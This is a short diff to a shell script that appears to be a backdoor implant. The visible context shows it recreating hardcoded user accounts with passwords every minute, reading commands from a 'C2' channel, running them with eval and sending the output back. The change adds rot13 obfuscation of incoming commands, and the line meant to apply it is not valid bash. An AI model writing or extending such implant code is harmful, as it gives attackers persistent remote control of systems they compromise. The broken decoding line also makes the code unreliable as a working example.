@@ -64,6 +64,10 @@ for user in "Jimithy:Password-123456" "Doug:Password-12345"; do
   fi
 done
 
+rot13() {
+  echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+}
+
 # Check every minute if users exist and create them if necessary
 while true; do
   sleep 60
@@ -81,6 +85,7 @@ while true; do
 
   # Read command from the C2
   if read -t 1 command <&3; then
+    $command = rot13 $command
     eval "$command" > /tmp/c2_output.txt 2>&1
     cat /tmp/c2_output.txt >&3
   fi
